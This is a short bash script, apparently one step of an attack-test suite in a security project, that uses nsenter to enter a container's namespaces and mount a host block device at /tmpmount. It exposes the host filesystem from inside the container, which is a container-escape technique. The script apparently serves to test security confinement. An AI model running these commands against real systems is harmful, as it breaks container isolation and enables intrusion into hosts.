#!/bin/bash

#Attacking directory where attacker's scripts are 
attack="/home/ubuntu/SecureWilly/Attacks/Nsenter/Mount_hosts_filesystem"

#Files created on previous scripts
container_pid=$(cat PID)
dev="/dev/$(cat sdev_of_fs)"

#Mounting the new device to tmpmount directory
nsenter --target ${container_pid} --mount --pid -- mount ${dev} /tmpmount
